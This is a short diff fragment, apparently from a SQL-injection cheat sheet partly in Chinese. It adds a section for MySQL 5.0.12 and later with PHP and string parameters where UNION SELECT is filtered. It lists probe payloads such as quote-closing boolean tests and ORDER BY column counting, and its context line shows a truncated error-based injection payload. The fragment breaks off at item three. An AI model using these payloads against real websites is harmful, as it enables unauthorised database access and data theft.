@@ -191,8 +191,11 @@ and (select 1 from(select count(*),concat((select (select (select concat(0x7e,�
    
 
 
-
-
+MySQL >= 5.0.12+php+字符型+union select被过滤
+Payload
+(1)' and 'a'='a
+(2)' order by xxx --+
+(3)
 
 
 
